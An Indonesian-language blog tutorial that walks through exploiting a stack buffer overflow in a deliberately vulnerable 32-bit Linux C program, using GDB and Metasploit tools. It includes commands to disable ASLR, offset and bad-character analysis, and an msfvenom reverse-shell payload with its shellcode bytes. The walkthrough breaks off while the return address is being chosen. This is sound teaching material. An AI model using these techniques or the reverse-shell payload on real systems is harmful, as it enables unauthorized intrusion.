---
title: 'Stack-based Buffer Overflows on Linux x86'
date: 2022-11-26 09:44:22 +0700
categories: ['Binary Exploitation', 'Linux']
tags: [assembly, buffer overflows, stack-buffer overflows, x86, binexp-linux]     # TAG names should always be lowercase
author:
  name: Nairpaa
  link: https://nairpaa.github.io
---

**Buffer overflows** menjadi kurang umum di dunia saat ini karena *compiler* modern telah memiliki perlindungan memori yang membuat bug *memory corruption* sulit terjadi secara tidak sengaja.

Singkatnya, *buffer overflows* disebabkan oleh kode program yang salah, yang tidak dapat memproses terlalu banyak data dengan benar sehingga dapat menyebabkan penyerang untuk memanipulasi pemrosesan CPU.

Untuk memahami kerentanan *buffer overflows* secara teknikal kita perlu memahami beberapa hal, diantaranya:
- Cara kerja memori.
- Menggunakan debugger untuk menampilkan setiap instruksi program.
- Menggunakan debugger untuk mendeteksi kerentanan.
- Cara untuk memanipulasi memori.

## 1. The Memory

Ketika sebuah program ([ELF](https://linuxhint.com/understanding_elf_file_format/)) dijalankan, setiap bagian program dipetakan ke dalam memori.

![Buffer Memori](/assets/img/posts/stack-buffer-overflows-linux/1.png)

### .text Segment

Segmen `.text` berisi instruksi assembler dari program yang dijalankan untuk diambil dan dieksekusi oleh CPU. 

Segmen ini bersifat *read-only* untuk mencegah terjadinya perubahan instruksi secara tidak sengaja. Setiap upaya untuk me-*write* ke segmen ini akan menghasilkan *segmentation fault*.

### .data Segment

Segmen `.data` berisi variabel global dan statis yang secara eksplisit diinisialisasikan oleh program.

### .bss Segment

Segmen `.bss` sebenarnya adalah bagian dari segmen `.data`.  Beberapa *compiler* dan *linkers* menggunakan segmen ini untuk menyimpan variabel yang belum ditetapkan (*buffer* memori untuk alokasi variabel nantinya). 

### Heap Segment

Segmen `heap` memiliki desain hierarki dan karenanya jauh lebih besar dan serbaguna dalam menyimpan data, karena data dapat disimpan dan diambil dalam urutan apa pun. Namun, hal tersebut membuat `heap` lebih lambat dari `stack`.

Segmen `heap` dialokasikan mulai dari akhir dari segmen `.bss` hingga ke alamat memori yang lebih tinggi (`stack`).

### Stack Segment

Segmen `stack` memiliki desain **Last-In-First-Out (LIFO)** dan ukurannya tetap. Data yang berada di dalamnya hanya dapat diakses dalam urutan tertentu dengan cara `push`*-ing* dan `pop`*-ing* data.

Proteksi memori modern (`DEP`/`ASLR`) dapat mencegah kerusakan yang disebabkan oleh *buffer overflows*. 

**DEP (Data Execution Protection)** membuat area `Stack` menjadi *read-only*.  Ide dibalik **DEP** adalah untuk mencegah user untuk menggunggah *shellcode* ke memori dan kemudian mengatur intruksi pointer (`EIP`) ke *shellcode* tersebut.

Untuk menyiasati hal tersebut penyerang menggunakan teknik **ROP (Return Oriented Programming)**, karena memungkinkan mereka untuk menggunggah *shellcode* ke *executable space* dan menggunakan `call` yang tersedia untuk menjalankannya. 

Dengan teknik **ROP**, penyerang perlu mengetahui alamat memori dari program yang berjalan. Jadi pertahanan terhadap serangan ini adalah dengan mengimplementasikan **ASLR (Address Space Layout Randomization)** yang mengacak alamat memori.

Penyerang dapat menyiasati `ASLR` dengan *leaking memory addresses*, tetapi hal ini membuat eksploitasi menjadi kurang andal dan terkadang tidak mungkin dilakukan. 

Sebagai contoh misalnya, **Server FTP Freefloat**, mudah dieksploitasi pada Windows XP (sebelum adanya `DEP`/`ASLR`). Namun jika dijalankan di sistem operasi modern, *buffer overflows* akan tetap ada tetapi tidak dapat dieksploitasi karena adanya perlindungan `DEP`/`ASLR`, karena tidak diketahui cara untuk *leaking memory addresses*-nya.

## 2. Vulnerable Program

Penyebab paling signifikan dari *buffer overflows* adalah penggunaan bahasa pemrograman yang tidak secara otomatis memantau batas *buffer* memori atau *stack* untuk mencegah *stack buffer overflows*. Contohnya adalah bahasa C dan C++, yang menekankan kinerja dan tidak membutuhkan pemantauan.

Berikut adalah beberapa fungsi pada bahasa C yang tidak melindungi memori secara mandiri:
- `strcpy`
- `gets`
- `sprintf`
- `scanf`
- `strcat`
- ...

### Vulnerable Program

Berikut adalah kode sederhana dalam bahasa C bernama `bow.c`{: .filepath} yang memiliki fungsi yang rentan terhadap *buffer overflows*, yaitu `strcpy()`.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bowfunc(char *string) {

	char buffer[1024];
	strcpy(buffer, string);
	return 1;
}

int main(int argc, char *argv[]) {

	bowfunc(argv[1]);
	printf("Done.\n");
	return 1;
}
```
{: file="bow.c" }

### Disable ASLR

Komputer modern memiliki pengamanan **ASLR**. Karena pada penjelasan ini adalah materi dasar, kita akan matikan terlebih dahulu proteksi ini:

```bash
➜ sudo su
(root) ➜ echo 0 > /proc/sys/kernel/randomize_va_space
(root) ➜ cat /proc/sys/kernel/randomize_va_space

0
```

### Compilation

Selanjutnya kita *compile* kode C tersebut menjadi binari ELF 32 bit.

```bash
➜ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32
bow32: ELF 32-bit LSB pie executable
 Intel 80386
 version 1 (SYSV)
 dynamically linked
 interpreter /lib/ld-linux.so.2
 BuildID[sha1]=f007b1f265ffc850e852e80c6360de616c1fe5d9
 for GNU/Linux 3.2.0
 not stripped
```

## 3. GDB Introductions

**GDB** atau **GNU Debugger** adalah debugger standar pada sistem Linux yang dikembangkan oleh proyek GNU. GDB mendukung banyak bahasa, seperti C, C++, Objective-C, Java, dan lain-lain.

### Instruction Set Architectures (ISA)

**Instruction Set Architectures (ISA)** menentukan sintaks dan semantik dari bahasa assembly pada setiap arsitektur.

Ada dua *Instruction Set Architectures* yang banyak digunakan, yaitu:
- `Complex Instruction Set Computer (CISC)` - Digunakan pada prosesor Intel dan AMD.
- `Reduced Instruction Set Computer (RISC)` - Digunakan pada prosesor ARM dan Apple.

### GDB Config

Karena prosesor yang menggunakan `CISC` (Intel dan AMD) masih mendominasi di dunia saat ini, saya akan membahas eksploitasi biner ini menggunakan ISA `CISC`.

Jalankan perintah berikut agar GDB menggunakan format Intel:

```bash
➜ echo 'set disassembly-flavor intel' > ~/.gdbinit
```

Jalankan perintah berikut untuk menjalankan program `bow32` pada GDB:

```bash
➜ gdb ./bow32 -q
```

## 4. CPU Registers

**Register** adalah komponen penting pada CPU. Register ini dibagi menjadi General register, Control register dan Segment register.

Register paling penting yang kita butuhkan adalah General register. Dalam hal ini, ada subdivisi lebih lanjut, yaitu Data Register, Pointer register dan Index register.

#### Data registers

| 32-bit Register | 64-bit Register | Deskripsi                                                                                                                    |
|-----------------|-----------------|------------------------------------------------------------------------------------------------------------------------------|
| `EAX`             | `RAX`             | **Accumulator** digunakan dalam input/output dan untuk operasi aritmatika.                                                   |
| `EBX`             | `RBX`             | **Base** digunakan dalam *indexed addressing*.                                                                               |
| `ECX`             | `RCX`             | **Counter** digunakan untuk memutar instruksi dan menghitung loop.                                                           |
| `EDX`             | `RDX`             | **Data** digunakan untuk I/O dan dalam operasi aritmatika untuk operasi perkalian dan pembagian yang melibatkan nilai besar. |

#### Pointer registers

| 32-bit Register | 64-bit Register | Deskripsi                                                                                                           |
|-----------------|-----------------|---------------------------------------------------------------------------------------------------------------------|
| `EIP`           | `RIP`           | **Instruction Pointer** menyimpan alamat offset dari instruksi berikutnya yang akan dieksekusi                      |
| `ESP`           | `RSP`           | **Stack Pointer** menunjuk ke bagian atas Stack.                                                                    |
| `EBP`           | `RBP`           | **Base Pointer** juga dikenal sebagai *Stack Base Pointer* dan *Frame Pointer* yang menunjuk ke bagian dasar Stack. |


#### Index registers

| 32-bit Register | 64-bit Register | Deskripsi                                                                       |
|-----------------|-----------------|---------------------------------------------------------------------------------|
| `ESI`           | `RSI`           | **Source Index** digunakan sebagai pointer dari sumber untuk operasi string.    |
| `EDI`           | `RDI`           | **Destination Index** digunakan sebagai pointer ke tujuan untuk operasi string. |

Berikut adalah sintaks dari fungsi `main` pada program `bow32`.

```nasm
➜ gdb ./bow32 -q

(gdb) disass main
Dump of assembler code for function main:
   0x000011d2 <+0>:     lea    ecx,[esp+0x4]
   0x000011d6 <+4>:     and    esp,0xfffffff0
   0x000011d9 <+7>:     push   DWORD PTR [ecx-0x4]
   0x000011dc <+10>:    push   ebp
   0x000011dd <+11>:    mov    ebp,esp
   0x000011df <+13>:    push   ebx
   0x000011e0 <+14>:    push   ecx
   0x000011e1 <+15>:    call   0x10a0 <__x86.get_pc_thunk.bx>
   0x000011e6 <+20>:    add    ebx,0x2e0e
   0x000011ec <+26>:    mov    eax,ecx
   0x000011ee <+28>:    mov    eax,DWORD PTR [eax+0x4]
   0x000011f1 <+31>:    add    eax,0x4
   0x000011f4 <+34>:    mov    eax,DWORD PTR [eax]
   0x000011f6 <+36>:    sub    esp,0xc
   0x000011f9 <+39>:    push   eax
   0x000011fa <+40>:    call   0x119d <bowfunc>  ; <--- CALL function
   ..<snip>..
```

Instruksi terpenting bagi kita saat ini adalah `CALL`. Instruksi ini digunakan untuk memanggil fungsi dan melakukan dua operasi, yaitu:
- Mem-*push* *return address* ke `Stack` sehingga eksekusi program dapat dilanjutkan setelah fungsi berhasil memenuhi tujuannya.
- Mengubah *instruction pointer* (`EIP`) ke tujuan `CALL` dan mengeksekusinya.

#### Endianess

Selama membuat dan menyimpan operasi dalam register dan memori, byte dibaca dalam urutan yang berbeda. Urutan byte ini disebut *endianess*. Terdapat 2 format *endianess*, yaitu *litte-endian* dan *big-endian*.

Pada *big-endian* urutan digit biner tertinggi disimpan diawal, sedangkan *little-endian*  
urutuan digit biner terendah disimpan diawal. 

Arsitektur `RISC` dan TCP/IP menggunakan *big-endian*. Sedankan arsitektur `CISC` menggunakan *little-endian*.

Contoh:
- Address: `0xffff0000`
- Word: `\xAA\xBB\xCC\xDD`

| Memory Address | 0xffff0000 | 0xffff0001 | 0xffff0002 | 0xffff0003 |
|----------------|------------|------------|------------|------------|
| **Big-Endian**     | AA         | BB         | CC         | DD         |
| **Little-Endian**  | DD         | CC         | BB         | AA         |

Informasi tentang *endianess* sangat penting, terutama saat kita ingin memanipulasi CPU untuk memproses alamat yang kita tuju.

## 5. Exploit Stack-Based Buffer Overflows

Setelah mempelajari teori yang dibutuhkan, selanjutnya kita akan masuk ke dalam pembahasan tentang tahapan untuk mengeksploitasi *buffer overflows*.

### Take Control of EIP

Salah satu aspek terpenting dari *stack-based buffer overflows* adalah mendapatkan kontrol terhadap **Intruction Pointer** (`EIP`), sehingga kita dapat menentukan alamat mana yang akan dieksekusi oleh program.

`EIP` ini nantinya akan kita arahkan ke alamat *shellcode*, hal ini membuat program akan menjalankan *shellcode* yang telah kita tentukan.

#### Segmentation Fault

Jika kita meng-input-kan huruf `U` (`\x55`) sebanyak 1200, kita akan mendapati bahwa nilai `EIP` berhasil tertimpa dan menyebabkan *Segmentation Fault*. 

Teknik untuk mencari *Segmentation Fault* ini disebut juga sebagai *fuzzing*.

```bash
➜ gdb -q bow32 

(gdb) r $(python2 -c 'print "\x55" * 1200') 
Starting program: /path/bow32 $(python2 -c 'print "\x55"* 1200')

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()  
```

```bash
(gdb) info registers
eax            0x1                 0x1
ecx            0xffffd310          0xffffd310
edx            0xffffcc26          0xffffcc26
ebx            0x55555555          0x55555555
esp            0xffffcb90          0xffffcb90
ebp            0x55555555          0x55555555     # <---- EBP overwritten
esi            0xffffcc74          0xffffcc74
edi            0xf7ffcb80          0xf7ffcb80
eip            0x55555555          0x55555555     # <---- EIP overwritten
eflags         0x10282             [ SF IF RF ] 
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
```

Secara visual hal ini dapat dilihat seperti berikut:

![Segmentation Fault](/assets/img/posts/stack-buffer-overflows-linux/3.png)

#### Detemine The Offset

Setelah mengetahui bahwa `EIP` bisa kita timpa, yang artinya bisa dimanipulasi. Selanjutnya kita harus mengetahui *buffer offset* yang diperlukan untuk menimpa `EIP`.

##### 1. Create Pattern

Untuk mengetahui *buffer offset* ini, kita akan menggunakan *tool* dari Metasploit. Jalankan perintah berikut untuk mendapatkan *pattern* input-an.

```bash
➜ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt

➜ cat pattern.txt          
Aa0Aa1Aa...<SNIP>...6Bn7Bn8Bn9
```

##### 2. GDB - Using Generated Pattern

Jalankan program dengan input-an *pattern* yang telah kita dapatkan sebelumnya.

```bash
(gdb) r < pattern.txt 
# atau
(gdb) r $(python2 -c 'print "Aa0Aa1Aa...<SNIP>...6Bn7Bn8Bn9"')
```

##### 3. GDB - EIP

Setelah itu program akan kembali mengalami *Segmentation Fault*. Terlihat bahwa nilai `EIP` dari hasil input-an sebelumnya adalah `0x69423569`.

```bash
(gdb) info registers eip
eip            0x69423569          0x69423569
```

##### 4. GDB - Offset

Untuk mengetahui *offset* yang diperlukan untuk *buffer* kita akan menggunakan *tool* dari Metasploit kembali. 

Terlihat pada hasil perintah di bawah, *offset* yang diperlukan adalah sebanyak 1036 bytes.

```bash
➜ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569          
[*] Exact match at offset 1036
```

Secara visual hal ini dapat dilihat seperti berikut:

![Control EIP](/assets/img/posts/stack-buffer-overflows-linux/4.png)

Untuk bisa memastikan bahwa kita bisa mengontrol `EIP` adalah dengan mengirimkan *offset* dengan huruf `U` (`\x55`) sebanyak 1036 bytes dan ditambah nilai `EIP` dengan huruf `D` (`\x44`) sebanyak 4 bytes.

```bash
(gdb) r $(python2 -c 'print "\x55" * 1036 + "\x44" * 4')  
Starting program: /path/bow32 $(python2 -c 'print "\x55" * 1036 + "\x44" * 4')

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()

(gdb) info registers eip
eip            0x44444444          0x44444444
```

Terlihat pada hasil di atas, alamat `EIP` yang dituju adalah `0x44444444` yang mana merupakan `\x44` sebanyak 4 bytes. Hal ini menunjukan bahwa kita berhasil mengontrol nilai `EIP`.

### Determine the Length for Shellcode

> Tahapan ini bisa dilewati. Tahapan ini hanya dilakukan untuk mempermudah seseorang yang baru mempelajari *buffer overflows*. 
{: .prompt-info }

Sekarang kita harus mencari tahu berapa banyak ruang yang kita miliki untuk *shellcode*.

Pertama, kita akan mencari tahu kira-kira seberapa besar *shellcode* yang akan digunakan. Untuk mendapatkan *shellcode*, kita akan menggunakan `msfvenom`.

```bash
➜ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c

No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
<SNIP>
```

Terlihat bahwa *shellcode* yang akan kita gunakan nanti sekitar 68 bytes.

Untuk berjaga-jaga, kita perlu mengambil rentang yang lebih besar jika suatu saat terdapat perubahan *shellcode* karena kondisi tertentu.

Selain itu, sebelum meletakan *shellcode*, biasanya kita meng-input-kan **no operation instruction (NOPs)** agar *shellcode* kita dapat diekseksui dengan bersih.

Jadi yang kita butuhkan sampai saat ini adalah:
- Kita membutuhkan 1040 bytes untuk mengakses EIP.
- Kita bisa juga menentukan NOPs sebanyak 100 bytes.
- 150 bytes untuk *shellcode*.

```c
   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4
```


```bash
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

Program received signal SIGSEGV, Segmentation fault.                                                                                                                                         
0x44444444 in ?? ()
```

Secara visual hal ini dapat dilihat seperti berikut:

![Kalkulasi Shellcode](/assets/img/posts/stack-buffer-overflows-linux/5.png)

### Identification of Bad Characters

Sebelumnya di sistem operasi UNIX-like, binari diawali dengan 2 bytes yang berisi "*magic number*" yang menentukan jenis file. 

Pada awalnya, ini digunakan untuk mengidentifikasi file objek untuk berbagai *platform*. Lambat laun konsep ini juga diterapkan dibanyak file ([lihat ini](https://en.wikipedia.org/wiki/List_of_file_signatures)).

*Reserved characters* seperti itu juga ada pada aplikasi, tetapi tidak selalu ada dan tidak selalu sama karakternya. *Reserved characters* juga dikenal sebagai *bad characters*, dapat bervariasi, tetapi biasanya karakternya seperti ini:
- `\x00` - Null Byte
- `\x0A` - Line Feed
- `\x0D` - Carriage Return
- `\xFF` - Form Feed

Berikut adalah 256 bytes karakter yang akan kita gunakan untuk mencari *bad characters* sebagai pertimbangan untuk membuat *shellcode* nantinya. 

```c
CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

Setelah itu kita akan menghitung ulang *buffer* kembali menjadi seperti berikut:

```bash
Buffer = "\x55" * (1040 - 256 - 4) = 780
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

Sekarang mari kita lihat fungsi `main`, lalu menetapkan *breakpoint*. Hal ini dilakukan karena jika kita menjalankannya sekarang, program akan *crash* tanpa memberikan informasi apa yang terjadi di dalam memori.

```bash
(gdb) disass main
Dump of assembler code for function main:
   0x000011d2 <+0>:     lea    ecx,[esp+0x4]
   0x000011d6 <+4>:     and    esp,0xfffffff0
   0x000011d9 <+7>:     push   DWORD PTR [ecx-0x4]
   0x000011dc <+10>:    push   ebp
   0x000011dd <+11>:    mov    ebp,esp
   0x000011df <+13>:    push   ebx
   0x000011e0 <+14>:    push   ecx
   0x000011e1 <+15>:    call   0x10a0 <__x86.get_pc_thunk.bx>
   0x000011e6 <+20>:    add    ebx,0x2e0e
   0x000011ec <+26>:    mov    eax,ecx
   0x000011ee <+28>:    mov    eax,DWORD PTR [eax+0x4]
   0x000011f1 <+31>:    add    eax,0x4
   0x000011f4 <+34>:    mov    eax,DWORD PTR [eax]
   0x000011f6 <+36>:    sub    esp,0xc
   0x000011f9 <+39>:    push   eax
   0x000011fa <+40>:    call   0x119d <bowfunc>   # <---- CALL bowfunc Function
   0x000011ff <+45>:    add    esp,0x10
   0x00001202 <+48>:    sub    esp,0xc
   0x00001205 <+51>:    lea    eax,[ebx-0x1fec]
   0x0000120b <+57>:    push   eax
   0x0000120c <+58>:    call   0x1050 <puts@plt>
   0x00001211 <+63>:    add    esp,0x10
   0x00001214 <+66>:    mov    eax,0x1
   0x00001219 <+71>:    lea    esp,[ebp-0x8]
   0x0000121c <+74>:    pop    ecx
   0x0000121d <+75>:    pop    ebx
   0x0000121e <+76>:    pop    ebp
   0x0000121f <+77>:    lea    esp,[ecx-0x4]
   0x00001222 <+80>:    ret    
End of assembler dump.
```

Tetapkan *breakpoint* pada nama fungsi yang rentan (dalam kasus ini `bowfunc`).

```bash
(gdb) break bowfunc
Breakpoint 1 at 0x11a1
```

Jalankan pernitah berikut dan kita cari tahu *bad characters*-nya.

```bash
gef➤  r $(python2 -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\..<SNIP>..\xff" + "\x66" * 4')                                     
Starting program: /home/kali/Labs/BinExp/bof32/bow32 $(python2 -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\..<SNIP>..\xff" + "\x66" * 4')                                                                                                                                                                                   

Breakpoint 1, 0x565561a1 in bowfunc () 

(gdb) x/2000xb $esp+500  

..<SNIP>..
0xffffced0:     0x69    0x6e    0x45    0x78    0x70    0x2f    0x62    0x6f                                                                                                                 
0xffffced8:     0x66    0x33    0x32    0x2f    0x62    0x6f    0x77    0x33                                                                                                                 
0xffffcee0:     0x32    0x00    0x55    0x55    0x55    0x55    0x55    0x55  # <--- Awal 0x55                                                                                                                
0xffffcee8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55                                                                                                                 
0xffffcef0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55 

..<SNIP>..
0xffffd208:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd210:     0x55    0x55    0x55    0x55    0x55    0x55    0x00    0x01  # <--- Awal List Karakter (setelah 0x55)
0xffffd218:     0x02    0x03    0x04    0x05    0x06    0x07    0x08    0x00
0xffffd220:     0x0b    0x0c    0x0d    0x0e    0x0f    0x10    0x11    0x12
0xffffd228:     0x13    0x14    0x15    0x16    0x17    0x18    0x19    0x1a
0xffffd230:     0x1b    0x1c    0x1d    0x1e    0x1f    0x00    0x21    0x22
0xffffd238:     0x23    0x24    0x25    0x26    0x27    0x28    0x29    0x2a
0xffffd240:     0x2b    0x2c    0x2d    0x2e    0x2f    0x30    0x31    0x32
0xffffd248:     0x33    0x34    0x35    0x36    0x37    0x38    0x39    0x3a
0xffffd250:     0x3b    0x3c    0x3d    0x3e    0x3f    0x40    0x41    0x42
0xffffd258:     0x43    0x44    0x45    0x46    0x47    0x48    0x49    0x4a
0xffffd260:     0x4b    0x4c    0x4d    0x4e    0x4f    0x50    0x51    0x52
0xffffd268:     0x53    0x54    0x55    0x56    0x57    0x58    0x59    0x5a
0xffffd270:     0x5b    0x5c    0x5d    0x5e    0x5f    0x60    0x61    0x62
0xffffd278:     0x63    0x64    0x65    0x66    0x67    0x68    0x69    0x6a
0xffffd280:     0x6b    0x6c    0x6d    0x6e    0x6f    0x70    0x71    0x72
0xffffd288:     0x73    0x74    0x75    0x76    0x77    0x78    0x79    0x7a
0xffffd290:     0x7b    0x7c    0x7d    0x7e    0x7f    0x80    0x81    0x82
0xffffd298:     0x83    0x84    0x85    0x86    0x87    0x88    0x89    0x8a
0xffffd2a0:     0x8b    0x8c    0x8d    0x8e    0x8f    0x90    0x91    0x92
0xffffd2a8:     0x93    0x94    0x95    0x96    0x97    0x98    0x99    0x9a
0xffffd2b0:     0x9b    0x9c    0x9d    0x9e    0x9f    0xa0    0xa1    0xa2
0xffffd2b8:     0xa3    0xa4    0xa5    0xa6    0xa7    0xa8    0xa9    0xaa
0xffffd2c0:     0xab    0xac    0xad    0xae    0xaf    0xb0    0xb1    0xb2
0xffffd2c8:     0xb3    0xb4    0xb5    0xb6    0xb7    0xb8    0xb9    0xba
0xffffd2d0:     0xbb    0xbc    0xbd    0xbe    0xbf    0xc0    0xc1    0xc2
0xffffd2d8:     0xc3    0xc4    0xc5    0xc6    0xc7    0xc8    0xc9    0xca
0xffffd2e0:     0xcb    0xcc    0xcd    0xce    0xcf    0xd0    0xd1    0xd2
0xffffd2e8:     0xd3    0xd4    0xd5    0xd6    0xd7    0xd8    0xd9    0xda
0xffffd2f0:     0xdb    0xdc    0xdd    0xde    0xdf    0xe0    0xe1    0xe2
0xffffd2f8:     0xe3    0xe4    0xe5    0xe6    0xe7    0xe8    0xe9    0xea
0xffffd300:     0xeb    0xec    0xed    0xee    0xef    0xf0    0xf1    0xf2
0xffffd308:     0xf3    0xf4    0xf5    0xf6    0xf7    0xf8    0xf9    0xfa
0xffffd310:     0xfb    0xfc    0xfd    0xfe    0xff    0x66    0x66    0x66
0xffffd318:     0x66    0x00    0x43    0x4f    0x4c    0x4f    0x52    0x46
..<SNIP>..
```

Setelah diperhatikan terdapat beberapa *bad characters*, yaitu:
- `0x09` = menjadi `0x00`
- `0x0a` = hilang
- `0x20` = menjadi `0x00`


### Generating Shellcodes

Kita sudah mengetahui perkiraan panjang *shellcode* yang dibutuhkan menggunakan `msfvenom`. Sekarang kita akan membuat shellcode dengan yang sebenarnya. 

Tetapi sebelum kita membuat *shellcode* ada beberapa hal yang harus kita pastikan, diantarnaya:
- Arsitektur target
- Platform target
- *Bad characters*

```bash
➜ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>

➜ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
Saved as: shellcode
```

```c
➜ cat shellcode                          
unsigned char buf[] = 
"\xb8\x35\x25\x1d\x59\xdd\xc2\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x12\x31\x42\x12\x83\xea\xfc\x03\x77\x2b\xff\xac\x46\xe8\x08"
"\xad\xfb\x4d\xa4\x58\xf9\xd8\xab\x2d\x9b\x17\xab\xdd\x3a\x18"
"\x93\x2c\x3c\x11\x95\x57\x54\xdd\x65\xa8\xa5\x49\x64\xa8\xdf"
"\xe0\xe1\x49\xaf\x95\xa1\xd8\x9c\xea\x41\x52\xc3\xc0\xc6\x36"
"\x6b\xb5\xe9\xc5\x03\x21\xd9\x06\xb1\xd8\xac\xba\x67\x48\x26"
"\xdd\x37\x65\xf5\x9e";
```

Dari hasil di atas, kita membutuhkan 95 bytes untuk *shellcodes*. Karena itu kita akan menghitung ulang *buffer* kembali menjadi seperti berikut:

```c
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

```bash
(gdb) run $(python2 -c 'print "\x55" * (1040 - 155 - 95 - 4) + "\x90" * 155 + "\xb8\x35...<SNIP>...\xf5\x9e" + "\x66" * 4')                                                                                            
Starting program: /home/kali/Labs/BinExp/bof32/bow32 $(python2 -c 'print "\x55" * (1040 - 155 - 95 - 4) + "\x90" * 155 + "\xb8\x35...<SNIP>...\xf5\x9e" + "\x66" * 4')

Breakpoint 1, 0x565561a1 in bowfunc ()
```

```bash
(gdb) x/2000xb $esp+550

0xffffd29a:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd2a2:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd2aa:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd2b2:     0x90    0x90    0x90    0x90    0xb8    0x35    0x25    0x1d   # <--- Awal Dari Shellcode
0xffffd2ba:     0x59    0xdd    0xc2    0xd9    0x74    0x24    0xf4    0x5a
0xffffd2c2:     0x29    0xc9    0xb1    0x12    0x31    0x42    0x12    0x83
0xffffd2ca:     0xea    0xfc    0x03    0x77    0x2b    0xff    0xac    0x46
0xffffd2d2:     0xe8    0x08    0xad    0xfb    0x4d    0xa4    0x58    0xf9
0xffffd2da:     0xd8    0xab    0x2d    0x9b    0x17    0xab    0xdd    0x3a
0xffffd2e2:     0x18    0x93    0x2c    0x3c    0x11    0x95    0x57    0x54
0xffffd2ea:     0xdd    0x65    0xa8    0xa5    0x49    0x64    0xa8    0xdf
0xffffd2f2:     0xe0    0xe1    0x49    0xaf    0x95    0xa1    0xd8    0x9c
```

### Identification of the Return Address

Selanjutnya kita akan membuat `EIP` untuk melompat/mengakses ke alamat memori dari **NOPs** yang telah kita buat sebelumnya. Hal ini dilakukan agar *shellcode* yang akan dijalankan bersih tanpa ada hambatan.

> Alamat memori yang kita tuju tidak boleh mengandung *bad characters* yang kita temukan sebelumnya.
{: .prompt-warning }


```bash
(gdb) x/2000xb $esp+550

0xffffd20a:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55                                                                                                                 
0xffffd212:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55                                                                                                                 
0xffffd21a:     0x55    0x90    0x90    0x90    0x90    0x90    0x90    0x90  # <--- Awal Dari NOPs                                                                                                               
0xffffd222:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90                                                                                                                 
0xffffd22a:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90                                                                                                                 
0xffffd232:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90                                                                                                                 
0xffffd23a:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90                                                                                                                 
0xffffd242:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd24a:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd252:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd25a:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
